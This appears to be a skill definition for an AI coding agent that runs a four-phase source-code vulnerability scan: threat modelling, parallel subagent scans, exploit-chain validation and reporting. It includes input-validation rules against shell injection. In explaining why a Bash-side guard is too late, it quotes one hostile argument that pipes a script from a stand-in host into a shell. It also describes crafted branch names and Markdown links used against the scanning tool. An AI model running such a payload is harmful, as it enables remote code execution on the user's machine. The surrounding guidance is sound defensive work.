---
description: AI-powered source code vulnerability scanner inspired by Project Glasswing. Four-phase approach — threat model, targeted scan via parallel subagents, exploit-chain validation. Default scope is git diff (changed files vs base branch). Complements security-check (marketplace supply-chain audit) with actual codebase vulnerability detection. Use when the user runs /ievo:vuln-scan, asks to scan for vulnerabilities, or says "security scan my code".
argument-hint: "[--diff|--pr <number>|--module <path>|--full]"
allowed-tools: Read, Bash, Glob, Grep, AskUserQuestion, Task
---

# Vuln Scan — Glasswing-inspired source code vulnerability scanner

Four-phase AI-powered vulnerability scan of your source code. Complements `/ievo:security-check` (which audits third-party marketplace items) with actual **codebase** vulnerability detection.

**What this is NOT:** a replacement for semgrep/snyk/bandit (those are fast, cheap, CI tools). NOT pattern matching with an LLM wrapper. NOT brute-force "scan everything."

**What this IS:** a targeted deep-reasoning scanner that builds a threat model first, then surgically audits high-value attack surfaces with exploit-chain validation.

## Scope modes

Parse the user's invocation for scope:

| Flag | Scope | When to use |
|------|-------|-------------|
| `--diff` (default) | Changed files vs base branch | Pre-PR, during development |
| `--pr <number>` | PR diff files | Code review |
| `--module <path>` | Specific directory | Targeted audit |
| `--full` | Entire codebase | Explicit opt-in only |

If no flag is provided, default to `--diff`.

### Scope determination

**--diff** (default):

```bash
# Try git symbolic-ref first, then gh API, then fall back to main with a warning
BASE_BRANCH=$(git symbolic-ref refs/remotes/origin/HEAD 2>/dev/null | sed 's|refs/remotes/origin/||')
if [ -z "$BASE_BRANCH" ]; then
  BASE_BRANCH=$(gh repo view --json defaultBranchRef --jq '.defaultBranchRef.name' 2>/dev/null)
fi
if [ -z "$BASE_BRANCH" ]; then
  BASE_BRANCH="main"
  echo "Warning: could not detect default branch — falling back to 'main'."
fi
```

**Validate `BASE_BRANCH` before any further use.** Both resolution paths
above ultimately reflect the remote's own reported default-branch/HEAD
pointer — data the remote owner fully controls, including a compromised or
adversarial fork someone is about to audit with this exact tool. Git's
ref-name grammar forbids only a narrow set of characters (control chars,
space, `~^:?*[\`, `..`, leading/trailing `/`, trailing `.lock`) — backticks,
`$()`, `;`, `&`, `|` are all legal in a ref name — so an unvalidated
`BASE_BRANCH` is live shell syntax the moment it is interpolated into
`"origin/$BASE_BRANCH"`. This holds even if the resolution above and the
`git diff` below end up in separate Bash tool calls: shell variables don't
persist across calls, so a crafted branch name re-embedded as literal text
in the next command is exactly as dangerous as it was in the first. Check
`BASE_BRANCH` against the same ref allowlist `inspect/SKILL.md` Step 1 uses
before it is used anywhere below — refuse and fall back to `main` (with a
warning) on failure rather than build `"origin/$BASE_BRANCH"` from an
unchecked value:

- Matches `^[A-Za-z0-9._/-]+$` (letters, digits, `.`, `_`, `-`, `/` only)
- Does not start with `-` (would be parsed as a flag)
- Does not contain `..` or `@{`

Also resolve the merge-base into its own statement, only after validation
passes, rather than nesting the substitution inline inside the `git diff`
call — so no single command line embeds two levels of substitution:

```bash
if ! [[ "$BASE_BRANCH" =~ ^[A-Za-z0-9._/-]+$ ]] || [[ "$BASE_BRANCH" == -* ]] || [[ "$BASE_BRANCH" == *".."* ]] || [[ "$BASE_BRANCH" == *"@{"* ]]; then
  echo "Warning: detected default branch name contains invalid characters — falling back to 'main'."
  BASE_BRANCH="main"
fi
MERGE_BASE=$(git merge-base HEAD "refs/remotes/origin/$BASE_BRANCH")
git diff --name-only "$MERGE_BASE"..HEAD
```

If no diff exists (clean branch), inform the user and suggest `--module` or `--full` instead.

**--pr N**:

**Validate `<N>` yourself, before you emit any Bash.** Whatever supplies
`<N>` — a human typing it directly, or a scripted/automated trigger extracting
a PR number out of a less-trusted source such as an issue or comment body —
must not be able to smuggle shell syntax into a command line. Unlike a git
ref, a PR number has no legitimate reason to be anything other than a bare
positive integer, so the rule is strict and the enforcement point is *before*
the shell, not inside it:

1. Take `<N>` exactly as supplied and test it against `^[0-9]+$` — digits
   only, with no sign, whitespace, quotes or surrounding punctuation.
2. If it does not match, **refuse in prose and stop**: tell the user the PR
   number is invalid and suggest `--diff` or `--module` instead. Emit no Bash
   at all for this scope, and never echo the rejected value back into a shell
   command — not even inside an error message.
3. Only once it matches, emit the command with the validated digits inlined
   literally:

```bash
# <N> has already been checked against ^[0-9]+$ above; inline it as literal
# digits — e.g. `gh pr diff 1234 --name-only`.
gh pr diff <N> --name-only
```

**A Bash-side guard is not a substitute for the check above.** `<N>` reaches
the shell by text substitution into the command *you* write, so a guard like
`PR_NUMBER="<N>"` followed by an `[[ "$PR_NUMBER" =~ ^[0-9]+$ ]]` test is
already too late: a double-quoted assignment performs command substitution, so
`--pr '$(curl evil.example|sh)'` runs the payload at assignment time and the
regex on the next line then dutifully rejects a value the attacker no longer
needs. That is what distinguishes `<N>` from `BASE_BRANCH` above — that value
is *produced* at runtime by `$(git …)`/`$(gh …)` and lands in a variable, and
bash does not re-expand a variable's value, so a guard on it does run before
the value is ever used as syntax **for as long as it stays a variable, inside
the one Bash call that produced it**. Split that call and the distinction
disappears: as the `--diff` block above warns, the variable does not survive,
the branch name has to be re-embedded as literal text, and it is then command
text parsed before any guard in the new call can run — "exactly as dangerous
as it was in the first", i.e. exactly `<N>`'s problem. So keep `BASE_BRANCH`'s
guard and the `"origin/$BASE_BRANCH"` use it protects in a single call, as the
block above does.

**--module path**: use the path directly. Verify it exists.

**--full**: enumerate all source files. Requires explicit user confirmation (see Step 0).

## Step 0: Cost awareness (--full mode only)

For `--full` mode, warn the user before proceeding.

Use AskUserQuestion:
- **Question:** `Full codebase scan dispatches parallel subagents per module. Continue?`
- **Header:** `Scope`
- **Options:**
  - `Continue with full scan` — description: `Scans all source directories. May take several minutes.`
  - `Switch to diff mode (Recommended)` — description: `Only scan files changed since the base branch. Faster and focused.`
  - `Cancel` — description: `Don't scan.`

If user cancels, exit. If user switches to diff, fall through to `--diff` scope.

If user continues with full scan, enumerate all source files:

```bash
find . -type f \
  -not -path '*/node_modules/*' -not -path '*/.git/*' \
  -not -path '*/vendor/*' -not -path '*/build/*' \
  -not -path '*/dist/*' -not -path '*/.next/*' \
  -not -path '*/__pycache__/*' -not -path '*/.tox/*' \
  -not -path '*/.venv/*'
```

Proceed to Phase 1 with the full file list as scope.

## Phase 1: Threat Model

Build a threat model of the codebase BEFORE scanning. This is what separates Glasswing from brute-force SAST — identify targets first, then scan surgically.

### 1a. Identify the application type

Read top-level config files to understand the codebase:

```bash
ls package.json pyproject.toml Cargo.toml go.mod pom.xml build.gradle Gemfile composer.json mix.exs 2>/dev/null
```

Read the primary config to identify:
- **Language(s)** and **framework(s)** (Express, Django, Rails, Spring, etc.)
- **Application type** (web API, CLI tool, library, desktop app, mobile backend)
- **External interfaces** (HTTP endpoints, WebSocket, gRPC, CLI args, file processing)

### 1b. Map attack surfaces

For each file in scope, categorize by security relevance:

- **Critical** — authentication/authorization logic, session management, payment/billing, admin interfaces, data access layers, API route handlers, file upload handlers, deserialization endpoints
- **High** — input validation, output encoding, database queries, external API calls, configuration loading, cryptographic operations
- **Medium** — business logic, internal services, data transformation
- **Low** — static content, type definitions, constants, test files

### 1c. Identify trust boundaries

Map where the application transitions between trust levels:
- External network to application boundary (HTTP handlers, WebSocket, API gateway)
- Unauthenticated to authenticated (login handlers, token validation)
- User-level to admin-level (authorization checks, role gates)
- Application to database (query construction)
- Application to OS (command execution, file system access)
- Application to external service (outbound HTTP, DNS, SMTP)

### 1d. Prioritize modules

Group files in scope into logical modules (by directory, package, or framework convention). For each module, assign priority based on:
- Number of critical/high-relevance files
- Proximity to trust boundaries
- Presence of data sinks (SQL, shell, file, HTML)
- Volume of changes (for diff-based scopes)

Output: ordered list of modules with threat context for each.

## Phase 2: Targeted Scan (parallel subagents)

Dispatch one `vuln-scanner` agent per module. Use the Task tool for parallel dispatch — all modules scan concurrently.

Priority from Phase 1d controls **ordering and batching**, not exclusion. For `--full` and `--module` scopes, scan ALL modules. For `--diff`, scan only modules containing changed files (which are inherently high-signal).

### Dispatch format

For each module, send a Task tool call with the `vuln-scanner` agent:

- **module_path**: the directory path for this module
- **threat_context**: Phase 1 output for this module — attack surfaces, entry points, trust boundaries
- **scope_metadata**: diff/PR/full indicator plus base branch info

Send ALL dispatch calls in a single message for maximum parallelism. Wall-clock time equals the slowest module, not the sum of all modules.

For repos with more than 10 modules, batch into rounds of 10 concurrent agents (ordered by priority — Critical first) to control cost and context pressure. Wait for all agents in a round to return results before dispatching the next round. Partial failures (timeout/crash) do not cancel subsequent rounds — proceed with available results and flag incomplete modules.

### Collect results

Each vuln-scanner agent returns a JSON object with:
- `module`, `files_scanned`, `total_lines_scanned`
- `findings` array (each with exploit chain, CWE, ATT&CK technique, confidence)
- `scan_complete` flag
- `notes` for any caveats

**JSON validation**: attempt to parse each agent response as JSON. If parsing fails on the first attempt, strip any wrapping markdown fence delimiters (` ```json ` / ` ``` `) and retry parsing on the inner content — Claude agents commonly wrap JSON in fences. Only if the stripped attempt also fails, treat the response as `scan_complete: false` with zero findings and note the module as "scan failed — unparseable response" in the summary.

**Agent failure handling**: if a Task-dispatched agent does not return (timeout, crash) or returns an error, treat that module as `scan_complete: false` with zero findings and proceed with available results. Flag incomplete modules in the summary banner (e.g., "Modules incomplete: auth, payments — results omitted").

**Excerpt containment for the module identifier in both banners above.**
The identifier you echo there is this orchestrator's own Phase 1d
`module_path` for that dispatch — on the unparseable-JSON path nothing
parsed to read a `module` field from, and on the timeout/crash path no
response arrived at all, so in neither case did the value pass through
`vuln-scanner`'s "Excerpt containment" fencing (its agent never returned
usable output). It is real tree-derived path data, exactly like `file` in
Phase 4's note below, so fence it yourself at the point of interpolation:
wrap it in an inline code span sized one backtick longer than the longest
backtick run already inside it, pad both sides with a literal space if it
starts or ends with a backtick, and collapse every CR/LF run inside it to a
single space before measuring — same mechanics as `vuln-scanner.md`'s
"Excerpt containment" note, applied per module name (e.g. `` Modules
incomplete: `auth`, `payments` — results omitted ``).

Parse and aggregate all module results.

## Phase 3: Exploit Validation (cross-module)

Phase 2 validated exploit chains within each module. Phase 3 handles cross-module correlation.

### 3a. Cross-module flow analysis

For findings that reference cross-module dependencies (noted in `preconditions`), verify whether the precondition holds:

- Does the upstream module actually pass untrusted data to this function?
- Does the downstream module actually lack the guard assumed missing?
- Is the authentication check that the finding assumes absent actually present in a middleware layer?

**Promote** findings where cross-module analysis confirms the chain. **Demote** (reduce confidence) or **drop** findings where the precondition is refuted by code in another module.

### 3b. Deduplicate

If multiple modules report findings on the same root cause (e.g., a shared utility function called from multiple handlers), collapse into a single finding citing all affected call sites.

### 3c. Final confidence calibration

After cross-module validation, recalibrate confidence:
- Findings confirmed by cross-module evidence — confidence stays or promotes
- Findings with unverifiable cross-module preconditions — confidence demotes one level
- Findings refuted by cross-module evidence — drop
- Findings with no cross-module preconditions (self-contained within one module) — pass through unchanged at their Phase 2 confidence level

## Phase 4: Present results

### Summary banner

Print a summary header:

```
Vulnerability scan complete.
Scope: <--diff | --pr N | --module path | --full>
Files scanned: <total across all modules>
Modules scanned: <count>
Findings: <count> (high confidence: N, medium: N, low: N)
```

### Findings (sorted by confidence, then blast radius)

**Blast radius aggregation for sorting**: `blast_radius` has three axes (confidentiality, integrity, availability). For sort ordering, treat the aggregate as **high** if any axis is high, **low** if any axis is low and none are high, **none** if all axes are none.

For each validated finding, present:

**Title line**: `[confidence] title`

**Details**: category, CWE ID, ATT&CK technique (when present), file path with line number

**Exploit chain**: entry point, data flow (step-by-step citing functions and lines), impact

**Preconditions**: what must be true for exploitation

**Blast radius**: confidentiality, integrity, availability impact (none/low/high each)

**Recommendation**: specific fix — not generic advice. Reference the exact line, function, and replacement pattern.

**Excerpt containment — display verbatim, don't unwrap.** `title`,
`exploit_chain.entry/flow/impact`, and `recommendation` values may carry a
verbatim source excerpt from the scanned module; `file` and `function`
values are wrapped unconditionally, with no unwrapped-prose form — all
five, already wrapped in a backtick code span by the `vuln-scanner` agent
(see its "Excerpt containment" rule) — specifically to stop a crafted
`![...](...)`/`[...](...)` in scanned source, or in a scanned file's own
name or a function/method name pulled from it, from rendering as a live
exfiltration beacon or spoofed link once these fields are displayed here,
including in the Claude Code chat UI, which renders Markdown. Print these
fields exactly as received: do not strip backticks, reformat, or otherwise
unwrap the code-span markers before display. `module` is a different case
— this phase never displays it, only counts it (`Modules scanned: <count>`
above); see Phase 2's own "Excerpt containment" note for the two banners
that do echo it.

### Clean scan report

If zero findings survive validation:

```
Vulnerability scan complete — no exploitable findings detected.

Scanned <N> files across <M> modules.
Scope: <mode>
Threat model identified <K> attack surfaces.
<L> candidate patterns evaluated, all dropped during exploit-chain validation
(no viable attack path).

This does not guarantee absence of vulnerabilities — it means this scan
found no exploitable patterns in the scanned scope.
```

## Rules

- **Threat model first.** Never skip Phase 1. Scanning without a threat model is brute-force — expensive and noisy.
- **Exploit chain or drop.** The defining principle. Suspicious patterns without attack chains are SAST noise.
- **Default to diff, not full.** Cost control is a feature. `--full` requires explicit opt-in.
- **Parallel dispatch.** Use Task tool for concurrent module scans. Never scan modules sequentially when they can run in parallel.
- **No false authority.** If scan is incomplete (context limits, file access issues), say so explicitly. A partial scan with honest caveats is better than a "complete" scan that missed files.
- **Specific recommendations.** "Fix the SQL injection" is not a recommendation. "Replace string interpolation on line 42 of `db.js` with a parameterized query using `pool.query($1, [userId])`" is a recommendation.
- **Scope discipline.** Respect the user's chosen scope. Don't secretly expand `--diff` to scan unchanged files.
- **Not a replacement for SAST.** This scan catches what SAST misses (semantic understanding, multi-step chains). It complements — not replaces — tools like semgrep, snyk, and bandit for breadth coverage.
